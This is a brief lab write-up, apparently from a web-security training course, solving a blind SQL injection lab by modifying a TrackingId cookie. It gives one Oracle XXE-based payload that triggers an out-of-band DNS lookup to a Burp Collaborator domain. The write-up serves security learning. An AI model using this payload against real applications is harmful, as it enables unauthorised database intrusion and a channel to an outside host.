This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

> Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Burp Suite to intercept and modify the request containing the TrackingId cookie.

Modifying the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server.

![image](https://github.com/udayk01/Web-Security/assets/52235763/1ba24fa6-be85-4765-b1d3-fdac89709dfa)

> TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//**BURP-COLLABORATOR-SUBDOMAIN**/">+%25remote%3b]>'),'/l')+FROM+dual--

> "Insert Collaborator payload" to insert a Burp Collaborator subdomain

![image](https://github.com/udayk01/Web-Security/assets/52235763/cf667f0f-ba73-44b0-b494-8ff33b13b441)
